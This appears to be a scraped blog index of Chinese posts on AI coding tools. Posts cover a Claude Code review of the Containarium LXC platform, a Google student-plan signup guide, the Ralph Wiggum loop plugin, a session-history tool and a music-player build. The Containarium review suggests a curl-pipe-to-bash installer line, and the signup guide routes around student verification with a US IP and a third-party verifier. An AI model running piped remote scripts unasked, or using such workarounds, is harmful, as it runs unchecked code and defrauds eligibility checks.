选择系统容器(LXC)而非应用容器,更适合多用户开发环境 ZFS 存储: 支持压缩、配额、快照,数据在 Spot 实例重启后完全保留 安全多租户: 每个用户独立的 jump server 账户(proxy-only,无 shell 访问) unprivileged 容器隔离 fail2ban + SSH 审计日志 工程质量高 类型安全: 使用 Protobuf/gRPC 定义接口 测试完备: 包含基于 Terraform 的 E2E 测试,验证 ZFS 持久化 文档完善: README 长达 2400+ 行,包含详细架构图、使用指南、FAQ 生产就绪: 支持 mTLS 远程管理、水平扩展、负载均衡 🎯 技术可行性分析\n✅ 已实现的核心功能\n功能模块 状态 评估 Go CLI + gRPC API ✅ 完成 代码结构清晰,使用 Cobra 框架 Incus/LXC 集成 ✅ 完成 完整的容器生命周期管理 Terraform 部署 ✅ 完成 支持单服务器和水平扩展(3-5 台) Spot 实例 + ZFS ✅ 完成 自动恢复机制,数据 0 丢失 安全多租户架构 ✅ 完成 Jump server proxy-only 账户 E2E 测试 ✅ 完成 验证 reboot 后数据持久化 ⚠️ 技术依赖风险\nIncus 版本要求严格 - 必须 ≥ 6.19: Ubuntu 24.04 默认 6.0.0 有 AppArmor 漏洞 (CVE-2025-52881)\r- 缓解: 已在文档中说明,提供 Zabbly 源安装方法\r- 风险等级: 🟡 中等 - 需用户手动安装新版本\r内核模块依赖 - 需要 overlay, br_netfilter, nf_nat 支持容器内 Docker\r- 风险等级: 🟢 低 - 现代 Linux 内核普遍支持\r云平台绑定 - 当前仅支持 GCP (AWS/Azure 在路线图中)\r- 风险等级: 🟡 中等 - 限制了用户选择\r📊 市场定位与竞争分析\n✅ 目标用户群体明确\n开发团队(50-250 人)需要 SSH 开发环境 教育/训练营(快速部署临时环境) AI/ML 实验沙盒 成本敏感型企业 🆚 与竞品对比\n工具 优化目标 Containarium 优势 Codespaces 浏览器 IDE SSH 原生工作流,成本低 92% Kubernetes 应用编排 无需 K8s 复杂性,秒级启动 Proxmox 通用虚拟化 云原生,自动化部署 传统 VM-per-user 灵活性 成本低 92%,密度高 50x 差异化优势: 专注于\u0026quot;廉价、快速、SSH 访问\u0026quot;的开发环境,而非通用虚拟化或应用部署。\n🚨 潜在风险与挑战\n用户体验复杂度 🟡 问题:\n需要手动安装 Incus 6.19+ (Ubuntu 默认版本不可用) SSH ProxyJump 配置对非技术用户有门槛 建议:\n提供一键安装脚本 (自动添加 Zabbly 源) 开发 Web UI 简化容器管理(已在路线图中) 单点故障风险 🟠 问题:\n单服务器模式下,VM 宕机影响所有用户 Spot 实例被抢占时有 2-5 分钟不可用 建议:\n推荐生产环境使用 3+ 服务器水平扩展 考虑添加 regular 实例作为备用(成本增加但可用性提升) 资源超卖风险 🟡 问题:\n文档提到可\u0026quot;超卖\u0026quot; CPU (4-8x),但未说明监控和限流机制 建议:\n添加资源监控告警(Prometheus/Grafana) 实现动态资源调度(根据实际使用调整配额) 数据备份依赖云服务 🟢 优势:\nZFS 快照 + GCP 自动备份(30 天保留) prevent_destroy = true 保护数据盘 建议:\n提供跨区域备份选项 支持导出容器到本地 💡 改进建议\n优先级 1: 易用性提升\n建议添加一键安装脚本 curl -fsSL https://containarium.io/install.sh | bash\n自动检测 OS,安装 Incus 6.19+,部署 Containarium 优先级 2: 监控与告警\n集成 Prometheus + Grafana 仪表盘 每个容器的 CPU/内存/磁盘使用率可视化 Spot 实例抢占预警 优先级 3: 多云支持\n优先支持 AWS (EC2 + EBS) 抽象云平台接口,减少供应商锁定 🎓 技术亮点\ngo:embed 嵌入 Terraform 文件: 测试时无需外部依赖,可移植性强 Jump Server 账户隔离: 每个用户独立账户 + /usr/sbin/nologin,避免横向攻击 Retry 机制处理锁冲突: 自动重试 google_guest_agent 导致的 /etc/passwd 锁定问题 ZFS 压缩: 默认启用 lz4 压缩,节省磁盘空间 📈 商业可行性\n✅ 适合场景\n中小型公司(50-200 人): 开发环境成本优化 教育机构: 快速部署学生实验环境 Freelancer/咨询公司: 为客户提供临时开发环境 ⚠️ 不适合场景\n企业级高可用需求: 单服务器模式不适合关键业务 Windows 用户: 仅支持 Linux 容器 强合规要求: 需要额外的审计和访问控制集成 🏁 最终评估\n可行性评分: ⭐⭐⭐⭐ (4/5)\n维度 评分 说明 技术成熟度 ⭐⭐⭐⭐⭐ 代码质量高,测试完备,生产就绪 成本优势 ⭐⭐⭐⭐⭐ 92% 成本节省,ROI 极高 易用性 ⭐⭐⭐ 需要一定技术背景,文档完善但初始设置复杂 可扩展性 ⭐⭐⭐⭐ 支持水平扩展,但缺少自动伸缩 安全性 ⭐⭐⭐⭐ 多层隔离,审计日志,但需要定期安全审查 ✅ 结论与推荐\nContainarium 是一个技术上可行且极具成本效益的项目, 特别适合:\n预算有限的开发团队 - 92% 成本节省是巨大优势 需要快速部署开发环境的场景 - 秒级启动,简单管理 已有 SSH 工作流的团队 - 无需改变现有习惯 建议行动:\n✅ 短期(1-3 个月): 在非关键项目中试用,验证实际效果 ✅ 中期(3-6 个月): 如果试用成功,逐步扩展到更多团队 ⚠️ 注意: 为关键业务保留传统 VM 或 Kubernetes 作为备选方案 最大风险:\nIncus 版本依赖和云平台锁定 建议密切关注 Incus 社区发展和多云支持进度 总体评价: 这是一个工程质量优秀、商业逻辑清晰、值得采用的开源项目,特别是对成本敏感且有 Linux 运维能力的团队。\n","permalink":"https://rendoumi.com/posts/20260113-lxc_containarium/","summary":"\u003cp\u003e现在的爱好是天天逛github.com，里面真的是有非常多的好项目\u003c/p\u003e\n\u003cp\u003e哪个好就clone下来，让Cluade Code来分析分析\u003c/p\u003e\n\u003cp\u003e推荐一个好的lxc容器平台\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ehttps://github.com/FootprintAI/Containarium\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e之所有说它好，是因为10年前，初到叮当的时候，就搭了一套LXC的容器平台，那时候Docker才方兴未艾，ZFS好像也才刚起步\u003c/p\u003e\n\u003cp\u003e找了三台特别普通的Dell R720 2U服务器，然后搭了LXC，一台物理机虚拟60台lxc容器，然后同事们用了大概6年，没有人意识到这只是个容器，并非完整虚机，但都当做完整虚机再使用，直到运行到第6年，大数据的同事在上面跑了若干elasticsearch，然后就拉跨了。原因是用的人过多，而es又认为有服务器的一半内存可用，一旦灌输数据，就把服务器拖死了。\u003c/p\u003e\n\u003cp\u003e这个项目也是相同的想法，也用lxc，然后用ZFS来当存储，这个主意很绝妙\u003c/p\u003e\n\u003cp\u003e完成度相当的高，用terraform来搭建底层支撑平台。\u003c/p\u003e\n\u003cp\u003e看看claude code的分析：\u003c/p\u003e\n\u003cp\u003e● 现在我已经获得了足够的信息来进行详细分析。让我基于收集的信息为您提供全面的项目可行性评估。\u003c/p\u003e\n\u003cp\u003eContainarium 项目详细分析与可行性评估\u003c/p\u003e\n\u003cp\u003e📋 项目概述\u003c/p\u003e\n\u003cp\u003eContainarium 是一个基于 LXC 系统容器的多租户开发环境平台,旨在通过在单个云虚拟机上运行数百个隔离的 Linux 开发环境,大幅降低基础设施成本(可节省高达92%)。\u003c/p\u003e\n\u003chr\u003e\n\u003cp\u003e✅ 核心优势与创新点\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e成本效益极高\u003c/li\u003e\n\u003c/ol\u003e\n\u003cul\u003e\n\u003cli\u003e资源密度: 相比传统 VM,每个容器仅消耗 100-500MB RAM,密度提升 10-50倍\u003c/li\u003e\n\u003cli\u003eSpot 实例: 利用 GCP Spot 实例可节省 76% 成本\u003c/li\u003e\n\u003cli\u003e实际数字: 50 用户从 $1,250/月 降至 $98/月 (92% 节省)\u003c/li\u003e\n\u003c/ul\u003e\n\u003col start=\"2\"\u003e\n\u003cli\u003e技术架构扎实\u003c/li\u003e\n\u003c/ol\u003e\n\u003cul\u003e\n\u003cli\u003eLXC vs Docker: 选择系统容器(LXC)而非应用容器,更适合多用户开发环境\u003c/li\u003e\n\u003cli\u003eZFS 存储: 支持压缩、配额、快照,数据在 Spot 实例重启后完全保留\u003c/li\u003e\n\u003cli\u003e安全多租户:\n\u003cul\u003e\n\u003cli\u003e每个用户独立的 jump server 账户(proxy-only,无 shell 访问)\u003c/li\u003e\n\u003cli\u003eunprivileged 容器隔离\u003c/li\u003e\n\u003cli\u003efail2ban + SSH 审计日志\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003col start=\"3\"\u003e\n\u003cli\u003e工程质量高\u003c/li\u003e\n\u003c/ol\u003e\n\u003cul\u003e\n\u003cli\u003e类型安全: 使用 Protobuf/gRPC 定义接口\u003c/li\u003e\n\u003cli\u003e测试完备: 包含基于 Terraform 的 E2E 测试,验证 ZFS 持久化\u003c/li\u003e\n\u003cli\u003e文档完善: README 长达 2400+ 行,包含详细架构图、使用指南、FAQ\u003c/li\u003e\n\u003cli\u003e生产就绪: 支持 mTLS 远程管理、水平扩展、负载均衡\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003cp\u003e🎯 技术可行性分析\u003c/p\u003e","title":"一个轻量级超级省钱的lxc平台containarium"},{"content":"Google 学生号的申请，备份一下，省的忘记了：\n首先前提是要有一个纯净的美国IP，可打开下面网址先看看纯净不纯净\nping0.cc 然后打开网页看看有没有权限\nhttps://gemini.google.com/students 然后不要乱点，一定要右键复制链接\n但是奇怪的是，我这边直接点了就过了，也是奇葩\n如果能Copy链接，就拷贝了\n然后到\nhttps://batch.1key.me 打开验证通过\n然后刷新页面，绑卡，就OK了。\n然后啊，需要打开\nhttps://aistudio.google.com/?authuser=3 拿到缺省项目的key，然后\nexport GEMINI_API_KEY=\u0026#34;你的API_KEY\u0026#34; 尝试gemini登录一下，问问它是什么模型\n最后别忘记在主号里面，管理会员资格，管理会员方案，打开共享\n就可以放心的登录antigravity了\n","permalink":"https://rendoumi.com/posts/20260113_google_pro/","summary":"\u003cp\u003eGoogle 学生号的申请，备份一下，省的忘记了：\u003c/p\u003e\n\u003cp\u003e首先前提是要有一个纯净的美国IP，可打开下面网址先看看纯净不纯净\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eping0.cc\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e然后打开网页看看有没有权限\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ehttps://gemini.google.com/students\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e然后不要乱点，一定要右键复制链接\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20260113113304335\" loading=\"lazy\" src=\"/posts/20260113_google_pro/image-20260113113304335.png\"\u003e\u003c/p\u003e\n\u003cp\u003e但是奇怪的是，我这边直接点了就过了，也是奇葩\u003c/p\u003e\n\u003cp\u003e如果能Copy链接，就拷贝了\u003c/p\u003e\n\u003cp\u003e然后到\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ehttps://batch.1key.me\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e打开验证通过\u003c/p\u003e\n\u003cp\u003e然后刷新页面，绑卡，就OK了。\u003c/p\u003e\n\u003cp\u003e然后啊，需要打开\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ehttps://aistudio.google.com/?authuser\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e3\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e拿到缺省项目的key，然后\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eexport\u003c/span\u003e \u003cspan class=\"nv\"\u003eGEMINI_API_KEY\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;你的API_KEY\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e尝试gemini登录一下，问问它是什么模型\u003c/p\u003e\n\u003cp\u003e最后别忘记在主号里面，管理会员资格，管理会员方案，打开共享\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20260113140511689\" loading=\"lazy\" src=\"/posts/20260113_google_pro/image-20260113140511689.png\"\u003e\u003c/p\u003e\n\u003cp\u003e就可以放心的登录antigravity了\u003c/p\u003e","title":"Google学生号的申请"},{"content":"拉尔夫·维古姆（Ralph Wiggum）：没完没了的 Claude 代码循环\n这其实是个梗：\nRalph Wiggum 是动画片《辛普森一家》中那个总是搞不清状况、智商不太在线的孩子。他最著名的梗图是 \u0026ldquo;I\u0026rsquo;m helping\u0026rdquo;（我在帮忙）。\n我们在calude-code源代码仓库中可以看到这个插件\nhttps://github.com/anthropics/claude-code/tree/main/plugins/ralph-wiggum\n核心概念：\n# You run ONCE: /ralph-loop \u0026#34;Your task description\u0026#34; --completion-promise \u0026#34;DONE\u0026#34; # Then Claude Code automatically: # 1. Works on the task # 2. Tries to exit # 3. Stop hook blocks exit # 4. Stop hook feeds the SAME prompt back # 5. Repeat until completion 翻译一下：\n# 执行命令 /ralph-loop \u0026#34;Your task description\u0026#34; --completion-promise \u0026#34;DONE\u0026#34; # 接下来 Claude Code 将自动执行以下操作： # 1. 处理/执行该任务 # 2. 尝试退出程序 # 3. “停止挂钩（Stop hook）”拦截并阻止退出 # 4. “停止挂钩”将完全相同的提示词（prompt）重新传回给系统 # 5. 重复上述循环，直到任务完成（即出现 \u0026#34;DONE\u0026#34;） 说白了就是Claude执行了一轮后要退出，然后拉尔夫就蹦出来阻止，没完；再跑一轮，又想退出，又被阻止，如此往复。\n直到任务完成，或者达到了最大轮数的限制\n这种不撞南墙不回头的气势值得赞叹\n我们如何在实践中应用呢？\n一、旧系统重构或框架迁移 /ralph-loop \u0026#34;Migrate tests from Jest to Vitest.\rSuccess criteria:\r- All tests pass\r- Snapshots unchanged\r- Updated config files\r- README updated\rOutput \u0026lt;promise\u0026gt;DONE\u0026lt;/promise\u0026gt; when complete.\u0026#34; \\\r--max-iterations 25 \\\r--completion-promise \u0026#34;DONE\u0026#34; /ralph-loop \u0026#34;将测试框架从 Jest 迁移到 Vitest。 成功标准： - 所有测试用例通过 - 快照（Snapshots）保持不变 - 配置文件已更新 - README 文档已更新 任务完成后输出 \u0026lt;promise\u0026gt;DONE\u0026lt;/promise\u0026gt;。\u0026#34; \\ --max-iterations 25 \\ --completion-promise \u0026#34;DONE\u0026#34; 这里的 DONE 是个目标，claude 是可以自动识别这个词的\n二、测试覆盖率% /ralph-loop \u0026#34;Add tests for all uncovered functions in src/utils.\rSuccess criteria:\r- Coverage \u0026gt;= 85%\r- All tests green\r- No lint errors\rOutput \u0026lt;promise\u0026gt;COMPLETE\u0026lt;/promise\u0026gt; when done.\u0026#34; \\\r--max-iterations 20 \\\r--completion-promise \u0026#34;COMPLETE\u0026#34; /ralph-loop \u0026#34;为 src/utils 目录下所有未覆盖的函数添加测试。 成功标准： - 测试覆盖率 \u0026gt;= 85% - 所有测试通过（显示绿色） - 无 Lint（代码规范）错误 完成后输出 \u0026lt;promise\u0026gt;COMPLETE\u0026lt;/promise\u0026gt;。\u0026#34; \\ --max-iterations 20 \\ --completion-promise \u0026#34;COMPLETE\u0026#34; 这里的COMPLETE同样是个目标，可以被claude自动识别\n三、启动一个新项目 /ralph-loop \u0026#34;Build a minimal TODO API.\rRequirements:\r- CRUD endpoints\r- Input validation\r- Tests for each endpoint\r- README with API docs\rOutput \u0026lt;promise\u0026gt;READY\u0026lt;/promise\u0026gt; when done.\u0026#34; \\\r--max-iterations 30 \\\r--completion-promise \u0026#34;READY\u0026#34; /ralph-loop \u0026#34;构建一个极简的 TODO API 接口。 需求： - 实现增删改查（CRUD）接口 - 输入验证（Input validation） - 每个接口均附带测试用例 - 包含 API 文档的 README 文件 完成后输出 \u0026lt;promise\u0026gt;READY\u0026lt;/promise\u0026gt;。\u0026#34; \\ --max-iterations 30 \\ --completion-promise \u0026#34;READY\u0026#34; READY 一样可以被 Claude 自动识别\n四、代码库统一标准 /ralph-loop \u0026#34;Standardise error handling in src/:\r- Replace inline string errors with Error subclasses\r- Add error tests where missing\r- Keep public API unchanged\rOutput \u0026lt;promise\u0026gt;STANDARDISED\u0026lt;/promise\u0026gt; when done.\u0026#34; \\\r--max-iterations 15 \\\r--completion-promise \u0026#34;STANDARDISED\u0026#34; /ralph-loop \u0026#34;标准化 src/ 目录下的错误处理逻辑： - 将内联字符串错误替换为 Error 的子类（Error subclasses） - 为缺失的地方补充错误处理测试 - 保持公共 API（外部接口）不变 完成后输出 \u0026lt;promise\u0026gt;STANDARDISED\u0026lt;/promise\u0026gt;。\u0026#34; \\ --max-iterations 15 \\ --completion-promise \u0026#34;STANDARDISED\u0026#34; STANDARDISED 一样是明确的指示词\n那ralph的标准模板\nTASK: \u0026lt;one sentence describing the change\u0026gt; SUCCESS CRITERIA: - \u0026lt;measurable requirement 1\u0026gt; - \u0026lt;measurable requirement 2\u0026gt; - \u0026lt;test/build/linters must pass\u0026gt; PROCESS: 1) Make the smallest change that moves toward success 2) Run tests or validation 3) Fix failures and repeat 4) If stuck after N iterations, summarise blockers and suggest next steps OUTPUT: \u0026lt;promise\u0026gt;YOUR_PROMISE\u0026lt;/promise\u0026gt; only when ALL criteria are met 就是：大目标、然后成功的标准是什么（最好是具体可实现的细节）；每轮的输出用语义明确的词指示成功；最后加上最大迭代次数。\n那运行 /plugin 就可以安装这个插件了\n","permalink":"https://rendoumi.com/posts/20260112-claude_ralph_wiggum/","summary":"\u003cp\u003e拉尔夫·维古姆（Ralph Wiggum）：没完没了的 Claude 代码循环\u003c/p\u003e\n\u003cp\u003e这其实是个梗：\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eRalph Wiggum\u003c/strong\u003e 是动画片《辛普森一家》中那个总是搞不清状况、智商不太在线的孩子。他最著名的梗图是 \u003cstrong\u003e\u0026ldquo;I\u0026rsquo;m helping\u0026rdquo;（我在帮忙）\u003c/strong\u003e。\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20260112092557711\" loading=\"lazy\" src=\"/posts/20260112-claude_ralph_wiggum/image-20260112092557711.png\"\u003e\u003c/p\u003e\n\u003cp\u003e我们在calude-code源代码仓库中可以看到这个插件\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/anthropics/claude-code/tree/main/plugins/ralph-wiggum\"\u003ehttps://github.com/anthropics/claude-code/tree/main/plugins/ralph-wiggum\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e核心概念：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# You run ONCE:\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/ralph-loop \u003cspan class=\"s2\"\u003e\u0026#34;Your task description\u0026#34;\u003c/span\u003e --completion-promise \u003cspan class=\"s2\"\u003e\u0026#34;DONE\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Then Claude Code automatically:\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 1. Works on the task\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 2. Tries to exit\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 3. Stop hook blocks exit\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 4. Stop hook feeds the SAME prompt back\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 5. Repeat until completion\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e翻译一下：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 执行命令\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/ralph-loop \u003cspan class=\"s2\"\u003e\u0026#34;Your task description\u0026#34;\u003c/span\u003e --completion-promise \u003cspan class=\"s2\"\u003e\u0026#34;DONE\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 接下来 Claude Code 将自动执行以下操作：\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 1. 处理/执行该任务\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 2. 尝试退出程序\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 3. “停止挂钩（Stop hook）”拦截并阻止退出\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 4. “停止挂钩”将完全相同的提示词（prompt）重新传回给系统\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 5. 重复上述循环，直到任务完成（即出现 \u0026#34;DONE\u0026#34;）\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e说白了就是Claude执行了一轮后要退出，然后拉尔夫就蹦出来阻止，没完；再跑一轮，又想退出，又被阻止，如此往复。\u003c/p\u003e","title":"claude code的Ralph Wiggum编程模式和技巧"},{"content":"现在基本Claude code 和 Codex 和 Gemini 混用\n运维本身的项目也不会怎么大\n用Claude的时候，开了很多项目去学习、研究；那历史和切回来继续研究就变得很重要，每次如果都从头开始分析，那崩溃了\n手搓了一个工具claude-history，可以观看历史，并且生成命令，可以在以前的session基础上继续研究\nhttp://github.com/zhangrr/claude-history\n纯用Go，前后端一起，监听端口是8888\n✨ 特性 单文件实现：所有功能集成在 main.go 一个文件中（约 900 行） 零依赖部署：编译后的二进制文件包含前端资源，无需额外文件 高性能：使用 Go 标准库，性能优异 跨平台：支持 Linux、macOS、Windows 实时流式传输：通过 SSE (Server-Sent Events) 实现实时更新 文件监控：使用 fsnotify 监控 Claude 会话文件变化 ","permalink":"https://rendoumi.com/posts/20260112-claude_history/","summary":"\u003cp\u003e现在基本Claude code 和 Codex 和 Gemini 混用\u003c/p\u003e\n\u003cp\u003e运维本身的项目也不会怎么大\u003c/p\u003e\n\u003cp\u003e用Claude的时候，开了很多项目去学习、研究；那历史和切回来继续研究就变得很重要，每次如果都从头开始分析，那崩溃了\u003c/p\u003e\n\u003cp\u003e手搓了一个工具claude-history，可以观看历史，并且生成命令，可以在以前的session基础上继续研究\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"http://github.com/zhangrr/claude-history\"\u003ehttp://github.com/zhangrr/claude-history\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e纯用Go，前后端一起，监听端口是8888\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20260112091316727\" loading=\"lazy\" src=\"/posts/20260112-claude_history/image-20260112091316727.png\"\u003e\u003c/p\u003e\n\u003ch2 id=\"-特性\"\u003e✨ 特性\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e单文件实现\u003c/strong\u003e：所有功能集成在 \u003ccode\u003emain.go\u003c/code\u003e 一个文件中（约 900 行）\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e零依赖部署\u003c/strong\u003e：编译后的二进制文件包含前端资源，无需额外文件\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e高性能\u003c/strong\u003e：使用 Go 标准库，性能优异\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e跨平台\u003c/strong\u003e：支持 Linux、macOS、Windows\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e实时流式传输\u003c/strong\u003e：通过 SSE (Server-Sent Events) 实现实时更新\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e文件监控\u003c/strong\u003e：使用 fsnotify 监控 Claude 会话文件变化\u003c/li\u003e\n\u003c/ul\u003e","title":"claude code的session历史回顾和继续工具"},{"content":"codex和claude code两者各有所长，尝试在一个音乐项目里把两者结合起来，试试看\n首先 clone 项目\ngit clone https://github.com/truelife0958/music888 然后命令它：\n请你把这个项目的api音乐源都提取出来然后制作一个api接口文档 然后得出一个结果\n然后新建一个目录，把这个文档单独拷贝进去，新启动一个codex\n请你看一下这个api接口文档并测试一下哪些是有效的，帮我制作一个音乐播放web，需要有喜欢，最近播放，以及用户创立。 让它运行，打开页面看看\n然后claude装好skills，Apple-Hig-Designer，地址是：https://github.com/axiaoge2/Apple-Hig-Designer\n分析当前项目，Using apple-hig-desiner skills 重新设计前端页面 代开claude\n回答几个问题\n确定方案后开始改造\n牛B吹得挺大：\n打开一看，250啊\n啥狗屁玩意，继续修去\n\u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;/.claude/skills/Apple-Hig-Designer/resources/design-tokens.css\u0026#34; /\u0026gt; 无法访问 刷新，擦的，图标都是错的\n顶栏的图标都是错的 修好后再看\n确实是苹果风格，点开设置，又拉跨了\n继续命令它改：\n设置，齿轮按钮打开后，配置窗口跑到最左面了，没有在右边 擦的，什么玩意，放中央，简直了\n弹窗放到按钮附近 最终还可以，但是。\n感觉这个skills还没有codex原生生成的好看。\n编程基本变成了口嗨的行为了，真的是脑洞大开。\n","permalink":"https://rendoumi.com/posts/20260109-codex_music/","summary":"\u003cp\u003ecodex和claude code两者各有所长，尝试在一个音乐项目里把两者结合起来，试试看\u003c/p\u003e\n\u003cp\u003e首先 clone 项目\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egit clone https://github.com/truelife0958/music888\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e然后命令它：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e请你把这个项目的api音乐源都提取出来然后制作一个api接口文档\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e\u003cimg alt=\"image-20260109194609943\" loading=\"lazy\" src=\"/posts/20260109-codex_music/image-20260109194609943.png\"\u003e\u003c/p\u003e\n\u003cp\u003e然后得出一个结果\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20260109194943822\" loading=\"lazy\" src=\"/posts/20260109-codex_music/image-20260109194943822.png\"\u003e\u003c/p\u003e\n\u003cp\u003e然后新建一个目录，把这个文档单独拷贝进去，新启动一个codex\u003c/p\u003e\n\u003cdiv 